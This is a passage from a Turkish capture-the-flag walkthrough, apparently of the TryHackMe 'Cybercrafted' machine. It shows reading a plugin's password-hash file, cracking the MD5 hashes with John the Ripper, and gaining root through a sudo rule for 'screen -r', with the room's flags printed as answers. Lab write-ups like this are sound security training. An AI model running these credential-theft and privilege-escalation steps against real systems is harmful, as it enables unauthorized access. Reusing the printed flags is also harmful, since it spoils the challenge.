xxultimatecreeperxx@cybercrafted:/$ cat /opt/minecraft/minecraft_server_flag.txt
THM{ba93767ae3db9f5b8399680040a0c99e}
xxultimatecreeperxx@cybercrafted:/$ 
```

Kullanıcımız minecraft grubunda

```bash
xxultimatecreeperxx@cybercrafted:/$ id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
xxultimatecreeperxx@cybercrafted:/$ 
```

Bu grubun hangi dosyaları görüntüleyebileceğine bakalım.

```bash
xxultimatecreeperxx@cybercrafted:/$ find / -type f -group minecraft 2>/dev/null
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/data/villages_nether.dat
/opt/minecraft/cybercrafted/world/data/villages.dat
/opt/minecraft/cybercrafted/world/data/villages_end.dat
/opt/minecraft/cybercrafted/world/data/Fortress.dat
/opt/minecraft/cybercrafted/world/forcedchunks.dat
/opt/minecraft/cybercrafted/world/uid.dat
/opt/minecraft/cybercrafted/world/stats/_madrins.json
/opt/minecraft/cybercrafted/world/stats/hank20000.json
/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
/opt/minecraft/cybercrafted/world/players/hank20000.dat
/opt/minecraft/cybercrafted/world/players/_madrins.dat
/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
/opt/minecraft/cybercrafted/world/region/r.0.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
/opt/minecraft/cybercrafted/permissions.yml
/opt/minecraft/cybercrafted/server-icon.png
/opt/minecraft/cybercrafted/world_the_end/session.lock
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_the_end/uid.dat
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
/opt/minecraft/cybercrafted/world_nether/session.lock
/opt/minecraft/cybercrafted/world_nether/level.dat_old
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_nether/level.dat
/opt/minecraft/cybercrafted/world_nether/uid.dat
/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
/opt/minecraft/cybercrafted/server.properties
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
xxultimatecreeperxx@cybercrafted:/$
```

note.txt dosyası buluyoruz.

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
WorldBackup  cybercrafted  minecraft_server_flag.txt  note.txt
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ 
```

note.txt de verilen bilgilerden ilerleyelim. Konfigürasyon dosyalarını okumaya çalışalım.

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
banned-ips.txt      commands.yml                  logs             plugins            white-list.txt  world_the_end
banned-players.txt  craftbukkit-1.7.2-server.jar  ops.txt          server-icon.png    world
bukkit.yml          help.yml                      permissions.yml  server.properties  world_nether
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ 
```

2 tane hash bulduk.

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -la
total 56
drwxr-x--- 3 cybercrafted minecraft  4096 Jun 27  2021 .
drwxr-x--- 7 cybercrafted minecraft  4096 Jun 27  2021 ..
drwxr-x--- 2 cybercrafted minecraft  4096 Oct  6  2021 LoginSystem
-rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27  2021 LoginSystem_v.2.4.jar
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$
```

Bulduğumuz hashleri bir dosyaya kaydedelim ve john the ripper kullanarak hashleri kıralım.

```bash
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (madrinch)
1g 0:00:00:01 DONE (2023-07-15 21:14) 0.8064g/s 11567Kp/s 11567Kc/s 11594KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```
 Hash'i kırmayı başardık.

cybercrafted kullanıcısıyla giriş yapalım ve user bayrağını bulalım.

```bash
cybercrafted@cybercrafted:~$ ls
user.txt
cybercrafted@cybercrafted:~$ cat user.txt 
THM{b4aa20aaf08f174473ab0325b24a45ca}
cybercrafted@cybercrafted:~$
```

Sırada yetki yükseltmek kaldı.

```bash
cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
cybercrafted@cybercrafted:~$ 
```

https://linuxize.com/post/how-to-use-linux-screen/

```bash
sudo /usr/bin/screen -r cybercrafted
```

Yetkimizi yükseltip root olduğumuza göre root bayrağını alabiliriz.

```bash
# whoami
root
# ls    
root.txt
# cat root.txt
THM{8bb1eda065ceefb5795a245568350a70}
# 
```
![fsoc](/images/fsoc.gif)

